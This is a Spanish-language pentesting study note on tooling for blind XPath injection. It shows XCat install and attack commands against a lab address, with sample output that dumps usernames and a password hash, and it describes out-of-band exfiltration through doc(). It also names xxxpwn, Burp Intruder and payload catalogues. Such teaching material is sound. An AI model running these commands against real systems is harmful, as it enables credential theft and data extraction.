---
tags:
  - Web/Red-Team
  - XPath
  - Pentesting/Enumeracion
  - Pentesting/Explotacion
  - Tipo/Arsenal
Descripción: "La explotación manual de XPath —oráculo, schema walking, extracción carácter a carácter— es inviable a mano contra un objetivo real"
Fecha de actualización: 2026-07-16
Nota previa: "[[06 - Evasión de filtros y WAF en XPath]]"
Nota siguiente: "[[08 - Prevención de XPath Injection]]"
Area: "[[XPath Injection.base|XPath Injection]]"
---
---

La explotación manual de XPath —oráculo, `schema walking`, extracción carácter a carácter— es inviable a mano contra un objetivo real. El tooling automatiza la detección y la extracción; el estándar de facto es **XCat**.

# XCat — el estándar para XPath ciega

<mark style="background: #ADCCFFA6;">[`XCat`](https://github.com/orf/xcat) es una CLI en Python (de Tom Forbes) que automatiza la detección y explotación de blind XPath injection</mark>. Instalación (requiere Python ≥3.7):

```shell-session
$ pip3 install cython
$ pip3 install xcat
```

Comandos principales: `detect` (detecta la inyección y su tipo), `run` (vuelca el documento XML), `shell` (ejecuta comandos si el motor lo permite), `injections`, `ip`.

Se le pasa la URL, el parámetro **vulnerable**, la lista de parámetros a enviar, y un `--true-string` que indica cuándo la consulta devolvió datos (un `!` delante lo niega):

```shell-session
$ xcat detect http://172.17.0.2/index.php q q=BAR f=fullstreetname --true-string='!No Result'

function call - last string parameter - single quote
Detected features:
  substring-search: True
  doc-function: False
  oob-http: False
  ...
```

Para inyección en POST se añaden `-m POST` y `--encode FORM`:

```shell-session
$ xcat run http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
<users><user><username>kgrenvile</username><password>cf9f2931ea9c3deb33e4405b420c4c99</password>...</users>
```

> [!success]+ Aceleración out-of-band
> El `detect` perfila el motor (`xpath-2/3`, `doc-function`, `oob-http`, `substring-search`, `saxon`, `linux`…). <mark style="background: #FFB86CA6;">Si el motor soporta la función `doc()`, XCat exfiltra *out-of-band*</mark>: en lugar de un bit por petición, embebe los datos en una URL que el servidor solicita a XCat, convirtiendo la extracción ciega en algo casi tan rápido como una in-band ([writeup del autor](https://tomforb.es/blog/exploiting-xpath-injection-vulnerabilities-with-xcat-1/)). Degrada con elegancia a técnicas más lentas si no está disponible.

# xxxpwn — la alternativa avanzada

[`xxxpwn`](https://github.com/feakk/xxxpwn) es una herramienta avanzada de blind XPath injection con extracción optimizada y soporte de `payloads` personalizados. Es el siguiente intento cuando las suposiciones de XCat no encajan con el objetivo (encoding raro, oráculo no estándar, contexto a medida).

# Burp Suite / Caido — manual y semi-automático

Para el trabajo fino: **Repeater** para confirmar el contexto y ajustar el `payload`, e **Intruder** para iterar carácter a carácter o pilotar la búsqueda binaria de la [[05 - XPath ciega y basada en tiempo|extracción ciega]]. El scanner activo de Burp incluye algún check de XPath, pero la mayoría de WAF no lo cubren, así que el descubrimiento sigue siendo manual.

# Librerías de payloads

[PayloadsAllTheThings — XPATH Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/) y [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html) mantienen catálogos de `payloads` para prueba manual y para alimentar Intruder.

> [!important]+ La herramienta acelera, no sustituye
> XCat depende por completo de su *feature-detection*: ante un contexto no estándar (encoding a medida, un oráculo que no sea contenido ni tiempo, un filtro personalizado) falla o da falsos negativos. <mark style="background: #8000E1A6;">Saber construir el oráculo y recorrer el esquema a mano</mark> —las notas [[05 - XPath ciega y basada en tiempo|anteriores]]— es lo que permite explotar cuando la automatización se atasca. Misma regla que con [[13 - Herramientas para Blind SQLi|SQLMap en blind SQLi]].
